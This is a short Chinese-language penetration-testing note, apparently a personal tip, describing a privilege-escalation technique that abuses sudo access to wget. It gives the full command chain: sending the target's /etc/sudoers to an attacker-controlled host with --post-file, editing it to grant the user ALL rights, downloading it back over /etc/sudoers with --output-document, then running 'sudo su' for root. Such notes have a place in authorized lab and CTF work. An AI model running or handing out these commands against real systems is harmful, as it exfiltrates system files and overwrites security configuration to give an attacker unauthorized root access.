# 特别地，有时在目标机上使用GTFOBins搜到的方法失效，这里记录一下wget的特殊提权方法

 

## 原理：

　　wget有两个选项：

　　--post-flie可以传送文件

　　--output-document可以将下载的文件另存为（即可以覆盖原文件）

 

## 方法：

### 1.先将目标机上etc文件夹下的sudoers上传到本地机上

```
sudo wget --post-file=etc/sudoers {my_ip}
my_ip为本地机ip
```
 

### 2.然后在本地机上修改修改sudoers文件，找到目标机用户名所在位置，把ROOT或NONE全修改为ALL。

```
例子：
jhinjax ALL=(ALL:ALL) ALL
```
 

 

### 3.修改完后在目标机上用wget获取本地机上的sudoers文件，通过--output可以直接覆盖目标机上原来的sudoers文件，即达到强行修改用户权限的方法。

```
sudo wget {my_ip:myports/../../sudoers} --output-document=/etc/sudoers
myports为本地机上开放的端口
```
 

### 最后

```
sudo su
```
即可为目标机上的root
